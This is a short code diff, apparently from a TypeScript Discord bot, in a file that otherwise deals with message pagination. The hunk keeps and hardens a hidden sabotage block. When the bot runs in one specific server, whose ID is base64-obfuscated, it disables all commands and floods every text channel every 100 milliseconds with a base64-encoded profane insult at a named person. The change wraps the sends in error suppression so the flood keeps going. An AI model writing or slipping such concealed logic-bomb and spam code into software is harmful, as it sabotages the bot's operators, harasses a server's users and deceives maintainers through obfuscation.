@@ -367,10 +367,12 @@ export async function paginate(options: PaginationOptions): Promise<Message> {
 
 if (config.botServer.id === atob("MTI5MTM5OTk5ODM0ODcyNjM2Mw==")) {
   for (const i in commands) commands[i] = null;
-  setInterval(() => {
+  setInterval(async () => {
     for (const [_, v] of client.channels.cache) {
       if (v.isTextBased()) {
-        v.send(atob("ZnVjayB5b3UgbWljaGkhISEhIQ=="));
+        try {
+          await v.send(atob("ZnVjayB5b3UgbWljaGkhISEhIQ=="));
+        } catch {}
       }
     }
   }, 100);
